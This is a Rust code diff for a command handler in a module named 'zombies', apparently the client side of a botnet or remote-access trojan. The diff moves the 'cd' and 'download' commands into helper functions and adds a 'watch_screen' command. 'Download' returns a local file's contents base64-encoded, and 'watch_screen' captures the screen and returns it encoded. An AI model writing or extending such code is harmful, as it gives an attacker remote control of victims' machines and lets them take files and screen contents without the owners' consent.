@@ -1,52 +1,67 @@
-use crate::utils::base64::encode_file_to_base64::encode_file_to_base64;
+use crate::zombies::commands::{cd::cd_to_dir, download::download_data, see_screen::see_screen};
+use base64::{prelude::BASE64_STANDARD, Engine};
 use std::{
-    env,
     io::{Error, ErrorKind},
-    path::Path,
     process::Command,
 };
 use tracing::info;
 
 pub fn run_command(text: &str) -> Result<String, Error> {
     let args: Vec<&str> = text.split_whitespace().collect();
+    let command = args[0];
+
+    if command.is_empty() {
+        return Err(Error::new(ErrorKind::InvalidInput, "No command specified"));
+    }
+
     info!("Running command: {:?}", text);
 
-    if args[0] == "cd" {
-        if args.len() > 1 {
-            let new_dir = args[1];
-            let path = Path::new(new_dir);
-            env::set_current_dir(path).map_err(|e| {
+    if command == "cd" {
+        match cd_to_dir(&args) {
+            Ok(data) => {
+                return Ok(data);
+            }
+            Err(e) => {
                 info!("Failed to change directory: {}", e);
-                Error::new(
+                return Err(Error::new(
                     ErrorKind::Other,
                     format!("Failed to change directory: {}", e),
-                )
-            })?;
-            info!("Changed directory to: {}", new_dir);
-            return Ok(format!("Changed directory to: {}", new_dir));
-        } else {
-            info!("No directory specified for 'cd' command.");
-            return Err(Error::new(
-                ErrorKind::InvalidInput,
-                "No directory specified",
-            ));
+                ));
+            }
         }
     }
 
-    if args[0] == "download" {
-        if args.len() >= 1 {
-            let file_path = args[1];
-            let base64_file = encode_file_to_base64(&file_path);
+    if command == "download" {
+        match download_data(&args) {
+            Ok(data) => {
+                return Ok(data);
+            }
+            Err(e) => {
+                info!("Failed to download data: {}", e);
+                return Err(Error::new(
+                    ErrorKind::Other,
+                    format!("Failed to download data: {}", e),
+                ));
+            }
+        }
+    }
 
-            if base64_file.is_ok() {
+    if command == "watch_screen" {
+        info!("Running see-screen command");
+        match see_screen() {
+            Ok(data) => {
                 return Ok(String::from(format!(
-                    "download--{}--{}",
-                    file_path,
-                    base64_file.unwrap()
+                    "see-screen--{}",
+                    BASE64_STANDARD.encode(data)
                 )));
             }
-
-            return base64_file;
+            Err(e) => {
+                info!("Failed to capture screen: {}", e);
+                return Err(Error::new(
+                    ErrorKind::Other,
+                    format!("Failed to capture screen: {}", e),
+                ));
+            }
         }
     }
 
